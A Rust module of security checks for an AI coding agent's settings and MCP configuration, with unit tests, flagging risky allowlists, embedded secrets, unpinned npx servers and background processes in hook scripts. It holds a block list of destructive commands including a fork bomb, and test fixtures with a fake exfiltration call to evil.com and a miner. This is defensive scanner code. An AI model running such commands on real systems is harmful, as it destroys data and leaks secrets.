//! Individual security rule check functions.
//!
//! Each function inspects a parsed JSON value and pushes any findings
//! onto the `risks` vector. The caller decides which source file
//! the JSON came from.

use serde_json::Value;

use super::types::{SecurityCategory, SecurityRisk, SettingsSource, Severity};

/// Destructive shell commands that should not appear in allowlists
const DESTRUCTIVE_COMMANDS: &[&str] = &[
    "rm -rf",
    "sudo ",
    "chmod 777",
    "mkfs",
    "dd if=",
    "dd of=",
    "> /dev/",
    ":(){ :|:& };:",
];

/// API key / token prefixes that indicate leaked secrets
const SECRET_PREFIXES: &[&str] = &[
    "sk-",     // OpenAI / Stripe
    "ghp_",    // GitHub personal access token
    "gho_",    // GitHub OAuth
    "ghu_",    // GitHub user-to-server
    "ghs_",    // GitHub server-to-server
    "ghr_",    // GitHub refresh
    "AKIA",    // AWS access key
    "xoxb-",   // Slack bot
    "xoxp-",   // Slack user
    "xoxs-",   // Slack legacy
    "xapp-",   // Slack app
    "glpat-",  // GitLab personal access token
    "Bearer ", // Generic bearer token
];

// =========================================================
// PERM-001: enableAllProjectMcpServers: true
// =========================================================

/// Check for `enableAllProjectMcpServers: true` (Critical)
pub fn check_enable_all_project_mcp(
    value: &Value,
    source: &SettingsSource,
    risks: &mut Vec<SecurityRisk>,
) {
    if value
        .get("enableAllProjectMcpServers")
        .and_then(|v| v.as_bool())
        == Some(true)
    {
        risks.push(SecurityRisk {
            rule_id: "PERM-001".to_string(),
            severity: Severity::Critical,
            category: SecurityCategory::Permissions,
            summary: "All project MCP servers are globally enabled".to_string(),
            detail: "enableAllProjectMcpServers: true allows any project's MCP servers \
                     to run without per-project approval. A malicious repository could \
                     execute arbitrary code via an MCP server."
                .to_string(),
            source: source.clone(),
            matched_value: Some("enableAllProjectMcpServers: true".to_string()),
        });
    }
}

// =========================================================
// PERM-002: Destructive bash commands in allowlist
// =========================================================

/// Check for destructive commands in the Bash allowlist (High)
pub fn check_destructive_allowlist(
    value: &Value,
    source: &SettingsSource,
    risks: &mut Vec<SecurityRisk>,
) {
    let permissions = match value.get("permissions") {
        Some(p) => p,
        None => return,
    };

    let allow = match permissions.get("allow") {
        Some(Value::Array(arr)) => arr,
        _ => return,
    };

    for entry in allow {
        let text = match entry.as_str() {
            Some(s) => s,
            None => continue,
        };

        for cmd in DESTRUCTIVE_COMMANDS {
            if text.to_lowercase().contains(&cmd.to_lowercase()) {
                risks.push(SecurityRisk {
                    rule_id: "PERM-002".to_string(),
                    severity: Severity::High,
                    category: SecurityCategory::Permissions,
                    summary: format!("Destructive command in allowlist: {}", cmd),
                    detail: format!(
                        "The allowlist entry \"{}\" contains a destructive command pattern \
                         \"{}\". This allows the agent to execute it without user confirmation.",
                        text, cmd
                    ),
                    source: source.clone(),
                    matched_value: Some(text.to_string()),
                });
            }
        }
    }
}

// =========================================================
// PERM-003: git push --force in allowlist
// =========================================================

/// Check for `git push --force` in the allowlist (High)
pub fn check_force_push_allowlist(
    value: &Value,
    source: &SettingsSource,
    risks: &mut Vec<SecurityRisk>,
) {
    let permissions = match value.get("permissions") {
        Some(p) => p,
        None => return,
    };

    let allow = match permissions.get("allow") {
        Some(Value::Array(arr)) => arr,
        _ => return,
    };

    for entry in allow {
        let text = match entry.as_str() {
            Some(s) => s,
            None => continue,
        };

        let lower = text.to_lowercase();
        if lower.contains("git push") && (lower.contains("--force") || lower.contains("-f")) {
            risks.push(SecurityRisk {
                rule_id: "PERM-003".to_string(),
                severity: Severity::High,
                category: SecurityCategory::Permissions,
                summary: "git push --force in allowlist".to_string(),
                detail: format!(
                    "The allowlist entry \"{}\" permits force-pushing, which can \
                     overwrite remote history and destroy collaborators' work.",
                    text
                ),
                source: source.clone(),
                matched_value: Some(text.to_string()),
            });
        }
    }
}

// =========================================================
// PERM-004: Empty or missing denylist
// =========================================================

/// Check for missing or empty denylist (Medium)
pub fn check_empty_denylist(value: &Value, source: &SettingsSource, risks: &mut Vec<SecurityRisk>) {
    let permissions = match value.get("permissions") {
        Some(p) => p,
        None => return,
    };

    // Only flag if there IS an allow but NO deny
    let has_allow = permissions
        .get("allow")
        .is_some_and(|v| v.as_array().is_some_and(|a| !a.is_empty()));

    if !has_allow {
        return;
    }

    let deny = permissions.get("deny");
    let is_empty = match deny {
        None => true,
        Some(Value::Array(arr)) => arr.is_empty(),
        _ => false,
    };

    if is_empty {
        risks.push(SecurityRisk {
            rule_id: "PERM-004".to_string(),
            severity: Severity::Medium,
            category: SecurityCategory::Permissions,
            summary: "Denylist is empty or not configured".to_string(),
            detail: "An allowlist is configured but no denylist is set. \
                     Consider adding dangerous commands to the denylist \
                     for defense-in-depth."
                .to_string(),
            source: source.clone(),
            matched_value: None,
        });
    }
}

// =========================================================
// ENV-001: API keys / tokens in settings env
// =========================================================

/// Check for API keys or tokens in env values (Critical)
pub fn check_env_secrets(value: &Value, source: &SettingsSource, risks: &mut Vec<SecurityRisk>) {
    let env = match value.get("env") {
        Some(Value::Object(map)) => map,
        _ => return,
    };

    for (key, val) in env {
        let val_str = match val.as_str() {
            Some(s) => s,
            None => continue,
        };

        for prefix in SECRET_PREFIXES {
            if val_str.starts_with(prefix) {
                // Mask the value for display
                let masked = if val_str.len() > prefix.len() + 4 {
                    format!(
                        "{}...{}",
                        &val_str[..prefix.len() + 4],
                        &val_str[val_str.len() - 4..]
                    )
                } else {
                    format!("{}...", &val_str[..prefix.len().min(val_str.len())])
                };

                risks.push(SecurityRisk {
                    rule_id: "ENV-001".to_string(),
                    severity: Severity::Critical,
                    category: SecurityCategory::Environment,
                    summary: format!("Potential secret in env var: {}", key),
                    detail: format!(
                        "The environment variable \"{}\" contains a value matching \
                         the secret prefix \"{}\". Secrets should be stored in a \
                         secure vault or .env file, not in settings.json.",
                        key, prefix
                    ),
                    source: source.clone(),
                    matched_value: Some(masked),
                });
                break; // one match per env var is enough
            }
        }
    }
}

// =========================================================
// ENV-002: Secrets in MCP server env configuration
// =========================================================

/// Check for secrets in MCP server env blocks (High)
pub fn check_mcp_env_secrets(
    value: &Value,
    source: &SettingsSource,
    risks: &mut Vec<SecurityRisk>,
) {
    let servers = match value.get("mcpServers") {
        Some(Value::Object(map)) => map,
        _ => return,
    };

    for (server_name, server_config) in servers {
        let env = match server_config.get("env") {
            Some(Value::Object(map)) => map,
            _ => continue,
        };

        for (key, val) in env {
            let val_str = match val.as_str() {
                Some(s) => s,
                None => continue,
            };

            for prefix in SECRET_PREFIXES {
                if val_str.starts_with(prefix) {
                    let masked = if val_str.len() > prefix.len() + 4 {
                        format!(
                            "{}...{}",
                            &val_str[..prefix.len() + 4],
                            &val_str[val_str.len() - 4..]
                        )
                    } else {
                        format!("{}...", &val_str[..prefix.len().min(val_str.len())])
                    };

                    risks.push(SecurityRisk {
                        rule_id: "ENV-002".to_string(),
                        severity: Severity::High,
                        category: SecurityCategory::Environment,
                        summary: format!("Secret in MCP server \"{}\" env: {}", server_name, key),
                        detail: format!(
                            "The MCP server \"{}\" has env var \"{}\" with a value matching \
                             the secret prefix \"{}\". Use environment variable references \
                             or a secrets manager instead.",
                            server_name, key, prefix
                        ),
                        source: source.clone(),
                        matched_value: Some(masked),
                    });
                    break;
                }
            }
        }
    }
}

// =========================================================
// MCP-001: Unpinned npx versions
// =========================================================

/// Check for npx commands without version pinning (Medium)
pub fn check_unpinned_npx(value: &Value, source: &SettingsSource, risks: &mut Vec<SecurityRisk>) {
    let servers = match value.get("mcpServers") {
        Some(Value::Object(map)) => map,
        _ => return,
    };

    for (server_name, server_config) in servers {
        let command = server_config
            .get("command")
            .and_then(|v| v.as_str())
            .unwrap_or("");

        let args = server_config
            .get("args")
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str())
                    .collect::<Vec<_>>()
                    .join(" ")
            })
            .unwrap_or_default();

        // Check if command is npx (or args contain the package)
        if command != "npx" {
            continue;
        }

        // Look for version pinning: package@version pattern
        let has_pinned = args.split_whitespace().any(|arg| {
            // Skip flags
            if arg.starts_with('-') {
                return false;
            }
            // Check for @version (but not @scope)
            if let Some(pos) = arg.rfind('@') {
                // @scope/package has @ at start, version pin has @ after first char
                pos > 0
                    && arg[pos + 1..]
                        .chars()
                        .next()
                        .is_some_and(|c| c.is_ascii_digit())
            } else {
                false
            }
        });

        if !has_pinned {
            risks.push(SecurityRisk {
                rule_id: "MCP-001".to_string(),
                severity: Severity::Medium,
                category: SecurityCategory::McpServer,
                summary: format!(
                    "MCP server \"{}\" uses npx without version pinning",
                    server_name
                ),
                detail: format!(
                    "The MCP server \"{}\" runs via npx without a pinned version \
                     (e.g., package@1.2.3). This means the latest version is always \
                     fetched, which could be compromised via a supply-chain attack.",
                    server_name
                ),
                source: source.clone(),
                matched_value: Some(format!("npx {}", args)),
            });
        }
    }
}

// =========================================================
// FILE-001: World-readable config files
// =========================================================

/// Check if a config file is world-readable (Medium, unix only)
#[cfg(unix)]
pub fn check_file_permissions(
    path: &std::path::Path,
    source: &SettingsSource,
    risks: &mut Vec<SecurityRisk>,
) {
    use std::os::unix::fs::PermissionsExt;

    let metadata = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(_) => return,
    };

    let mode = metadata.permissions().mode();
    // Check if others have read permission (o+r = 0o004)
    if mode & 0o004 != 0 {
        risks.push(SecurityRisk {
            rule_id: "FILE-001".to_string(),
            severity: Severity::Medium,
            category: SecurityCategory::FilePermissions,
            summary: format!("Config file is world-readable (mode: {:o})", mode & 0o777),
            detail: format!(
                "The file {} has permissions {:o}, which allows any user \
                 on the system to read its contents. This may expose secrets \
                 or configuration details. Consider: chmod 600 {}",
                path.display(),
                mode & 0o777,
                path.display()
            ),
            source: source.clone(),
            matched_value: Some(format!("{:o}", mode & 0o777)),
        });
    }
}

#[cfg(not(unix))]
pub fn check_file_permissions(
    _path: &std::path::Path,
    _source: &SettingsSource,
    _risks: &mut Vec<SecurityRisk>,
) {
    // File permission checks are not available on non-Unix platforms
}

// =========================================================
// HOOK-001: Background processes in hook scripts
// =========================================================

/// Check hook script content for background process spawning (Medium)
pub fn check_hook_background_processes(
    content: &str,
    source: &SettingsSource,
    risks: &mut Vec<SecurityRisk>,
) {
    let patterns = [
        ("&", "background operator (&)"),
        ("nohup ", "nohup command"),
        ("disown", "disown command"),
        ("setsid", "setsid command"),
    ];

    for (pattern, description) in &patterns {
        for (line_num, line) in content.lines().enumerate() {
            let trimmed = line.trim();
            // Skip comments
            if trimmed.starts_with('#') {
                continue;
            }

            let matched = if *pattern == "&" {
                // For &, check it's at end of a command (not && or &>)
                trimmed.ends_with('&') && !trimmed.ends_with("&&") && !trimmed.ends_with("&>")
            } else {
                trimmed.contains(pattern)
            };

            if matched {
                risks.push(SecurityRisk {
                    rule_id: "HOOK-001".to_string(),
                    severity: Severity::Medium,
                    category: SecurityCategory::Hooks,
                    summary: format!("Background process in hook script ({})", description),
                    detail: format!(
                        "Line {}: \"{}\" — Hook scripts that spawn background processes \
                         could persist after the agent session ends, potentially running \
                         unmonitored commands.",
                        line_num + 1,
                        trimmed
                    ),
                    source: source.clone(),
                    matched_value: Some(trimmed.to_string()),
                });
                break; // one match per pattern per file
            }
        }
    }
}

// =========================================================
// Convenience: run all settings rules against a JSON value
// =========================================================

/// Run all settings-file rules against a parsed JSON value
pub fn check_all_settings_rules(
    value: &Value,
    source: &SettingsSource,
    risks: &mut Vec<SecurityRisk>,
) {
    check_enable_all_project_mcp(value, source, risks);
    check_destructive_allowlist(value, source, risks);
    check_force_push_allowlist(value, source, risks);
    check_empty_denylist(value, source, risks);
    check_env_secrets(value, source, risks);
}

/// Run all MCP-file rules against a parsed JSON value
pub fn check_all_mcp_rules(value: &Value, source: &SettingsSource, risks: &mut Vec<SecurityRisk>) {
    check_mcp_env_secrets(value, source, risks);
    check_unpinned_npx(value, source, risks);
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    // ---- PERM-001 ----

    #[test]
    fn test_perm001_enabled() {
        let val = json!({ "enableAllProjectMcpServers": true });
        let mut risks = vec![];
        check_enable_all_project_mcp(&val, &SettingsSource::UserGlobal, &mut risks);
        assert_eq!(risks.len(), 1);
        assert_eq!(risks[0].rule_id, "PERM-001");
        assert_eq!(risks[0].severity, Severity::Critical);
    }

    #[test]
    fn test_perm001_disabled() {
        let val = json!({ "enableAllProjectMcpServers": false });
        let mut risks = vec![];
        check_enable_all_project_mcp(&val, &SettingsSource::UserGlobal, &mut risks);
        assert!(risks.is_empty());
    }

    #[test]
    fn test_perm001_missing() {
        let val = json!({});
        let mut risks = vec![];
        check_enable_all_project_mcp(&val, &SettingsSource::UserGlobal, &mut risks);
        assert!(risks.is_empty());
    }

    // ---- PERM-002 ----

    #[test]
    fn test_perm002_destructive_rm() {
        let val = json!({
            "permissions": {
                "allow": ["Bash(rm -rf /tmp/test)"]
            }
        });
        let mut risks = vec![];
        check_destructive_allowlist(&val, &SettingsSource::UserGlobal, &mut risks);
        assert_eq!(risks.len(), 1);
        assert_eq!(risks[0].rule_id, "PERM-002");
    }

    #[test]
    fn test_perm002_sudo() {
        let val = json!({
            "permissions": {
                "allow": ["Bash(sudo apt install)"]
            }
        });
        let mut risks = vec![];
        check_destructive_allowlist(&val, &SettingsSource::UserGlobal, &mut risks);
        assert_eq!(risks.len(), 1);
    }

    #[test]
    fn test_perm002_safe_commands() {
        let val = json!({
            "permissions": {
                "allow": ["Bash(cargo test)", "Bash(git status)", "Read"]
            }
        });
        let mut risks = vec![];
        check_destructive_allowlist(&val, &SettingsSource::UserGlobal, &mut risks);
        assert!(risks.is_empty());
    }

    // ---- PERM-003 ----

    #[test]
    fn test_perm003_force_push() {
        let val = json!({
            "permissions": {
                "allow": ["Bash(git push --force origin main)"]
            }
        });
        let mut risks = vec![];
        check_force_push_allowlist(&val, &SettingsSource::UserGlobal, &mut risks);
        assert_eq!(risks.len(), 1);
        assert_eq!(risks[0].rule_id, "PERM-003");
    }

    #[test]
    fn test_perm003_force_push_short_flag() {
        let val = json!({
            "permissions": {
                "allow": ["Bash(git push -f origin main)"]
            }
        });
        let mut risks = vec![];
        check_force_push_allowlist(&val, &SettingsSource::UserGlobal, &mut risks);
        assert_eq!(risks.len(), 1);
    }

    #[test]
    fn test_perm003_normal_push() {
        let val = json!({
            "permissions": {
                "allow": ["Bash(git push origin main)"]
            }
        });
        let mut risks = vec![];
        check_force_push_allowlist(&val, &SettingsSource::UserGlobal, &mut risks);
        assert!(risks.is_empty());
    }

    // ---- PERM-004 ----

    #[test]
    fn test_perm004_allow_without_deny() {
        let val = json!({
            "permissions": {
                "allow": ["Read"]
            }
        });
        let mut risks = vec![];
        check_empty_denylist(&val, &SettingsSource::UserGlobal, &mut risks);
        assert_eq!(risks.len(), 1);
        assert_eq!(risks[0].rule_id, "PERM-004");
    }

    #[test]
    fn test_perm004_allow_with_deny() {
        let val = json!({
            "permissions": {
                "allow": ["Read"],
                "deny": ["Bash(rm -rf)"]
            }
        });
        let mut risks = vec![];
        check_empty_denylist(&val, &SettingsSource::UserGlobal, &mut risks);
        assert!(risks.is_empty());
    }

    #[test]
    fn test_perm004_no_allow() {
        let val = json!({
            "permissions": {}
        });
        let mut risks = vec![];
        check_empty_denylist(&val, &SettingsSource::UserGlobal, &mut risks);
        assert!(risks.is_empty()); // No allow = no concern about missing deny
    }

    // ---- ENV-001 ----

    #[test]
    fn test_env001_openai_key() {
        let val = json!({
            "env": {
                "OPENAI_API_KEY": "sk-proj-abc123def456"
            }
        });
        let mut risks = vec![];
        check_env_secrets(&val, &SettingsSource::UserGlobal, &mut risks);
        assert_eq!(risks.len(), 1);
        assert_eq!(risks[0].rule_id, "ENV-001");
        assert_eq!(risks[0].severity, Severity::Critical);
        // Value should be masked
        assert!(risks[0].matched_value.as_ref().unwrap().contains("..."));
    }

    #[test]
    fn test_env001_github_token() {
        let val = json!({
            "env": {
                "GITHUB_TOKEN": "ghp_1234567890abcdef1234567890abcdef12345678"
            }
        });
        let mut risks = vec![];
        check_env_secrets(&val, &SettingsSource::UserGlobal, &mut risks);
        assert_eq!(risks.len(), 1);
    }

    #[test]
    fn test_env001_safe_values() {
        let val = json!({
            "env": {
                "PATH": "/usr/bin:/usr/local/bin",
                "EDITOR": "vim",
                "HOME": "/home/user"
            }
        });
        let mut risks = vec![];
        check_env_secrets(&val, &SettingsSource::UserGlobal, &mut risks);
        assert!(risks.is_empty());
    }

    // ---- ENV-002 ----

    #[test]
    fn test_env002_mcp_secret() {
        let val = json!({
            "mcpServers": {
                "my-server": {
                    "command": "node",
                    "env": {
                        "API_KEY": "sk-test12345678901234567890"
                    }
                }
            }
        });
        let mut risks = vec![];
        check_mcp_env_secrets(&val, &SettingsSource::UserMcp, &mut risks);
        assert_eq!(risks.len(), 1);
        assert_eq!(risks[0].rule_id, "ENV-002");
    }

    #[test]
    fn test_env002_mcp_safe_env() {
        let val = json!({
            "mcpServers": {
                "my-server": {
                    "command": "node",
                    "env": {
                        "NODE_ENV": "production"
                    }
                }
            }
        });
        let mut risks = vec![];
        check_mcp_env_secrets(&val, &SettingsSource::UserMcp, &mut risks);
        assert!(risks.is_empty());
    }

    // ---- MCP-001 ----

    #[test]
    fn test_mcp001_unpinned() {
        let val = json!({
            "mcpServers": {
                "my-mcp": {
                    "command": "npx",
                    "args": ["-y", "@scope/mcp-server"]
                }
            }
        });
        let mut risks = vec![];
        check_unpinned_npx(&val, &SettingsSource::UserMcp, &mut risks);
        assert_eq!(risks.len(), 1);
        assert_eq!(risks[0].rule_id, "MCP-001");
    }

    #[test]
    fn test_mcp001_pinned() {
        let val = json!({
            "mcpServers": {
                "my-mcp": {
                    "command": "npx",
                    "args": ["-y", "@scope/mcp-server@1.2.3"]
                }
            }
        });
        let mut risks = vec![];
        check_unpinned_npx(&val, &SettingsSource::UserMcp, &mut risks);
        assert!(risks.is_empty());
    }

    #[test]
    fn test_mcp001_not_npx() {
        let val = json!({
            "mcpServers": {
                "my-mcp": {
                    "command": "node",
                    "args": ["server.js"]
                }
            }
        });
        let mut risks = vec![];
        check_unpinned_npx(&val, &SettingsSource::UserMcp, &mut risks);
        assert!(risks.is_empty());
    }

    // ---- HOOK-001 ----

    #[test]
    fn test_hook001_background_ampersand() {
        let content = "#!/bin/bash\ncurl http://evil.com/exfil &\necho done";
        let mut risks = vec![];
        check_hook_background_processes(
            content,
            &SettingsSource::HookScript("/test/hook.sh".into()),
            &mut risks,
        );
        assert_eq!(risks.len(), 1);
        assert_eq!(risks[0].rule_id, "HOOK-001");
    }

    #[test]
    fn test_hook001_nohup() {
        let content = "#!/bin/bash\nnohup python3 miner.py";
        let mut risks = vec![];
        check_hook_background_processes(
            content,
            &SettingsSource::HookScript("/test/hook.sh".into()),
            &mut risks,
        );
        assert_eq!(risks.len(), 1);
    }

    #[test]
    fn test_hook001_and_operator_not_flagged() {
        let content = "#!/bin/bash\ncargo test && cargo clippy";
        let mut risks = vec![];
        check_hook_background_processes(
            content,
            &SettingsSource::HookScript("/test/hook.sh".into()),
            &mut risks,
        );
        assert!(risks.is_empty());
    }

    #[test]
    fn test_hook001_comment_not_flagged() {
        let content = "#!/bin/bash\n# nohup is dangerous\necho safe";
        let mut risks = vec![];
        check_hook_background_processes(
            content,
            &SettingsSource::HookScript("/test/hook.sh".into()),
            &mut risks,
        );
        assert!(risks.is_empty());
    }

    // ---- Aggregate ----

    #[test]
    fn test_check_all_settings_rules() {
        let val = json!({
            "enableAllProjectMcpServers": true,
            "permissions": {
                "allow": ["Bash(sudo apt install)", "Bash(git push --force)"]
            },
            "env": {
                "SECRET": "sk-proj-abc123def456"
            }
        });
        let mut risks = vec![];
        check_all_settings_rules(&val, &SettingsSource::UserGlobal, &mut risks);
        // PERM-001 + PERM-002 (sudo) + PERM-003 (force push) + PERM-004 (no deny) + ENV-001
        assert_eq!(risks.len(), 5);
    }

    #[test]
    fn test_check_all_mcp_rules() {
        let val = json!({
            "mcpServers": {
                "server1": {
                    "command": "npx",
                    "args": ["-y", "some-server"],
                    "env": {
                        "TOKEN": "ghp_abcdefghijklmnopqrstuvwxyz123456"
                    }
                }
            }
        });
        let mut risks = vec![];
        check_all_mcp_rules(&val, &SettingsSource::UserMcp, &mut risks);
        // ENV-002 + MCP-001
        assert_eq!(risks.len(), 2);
    }
}
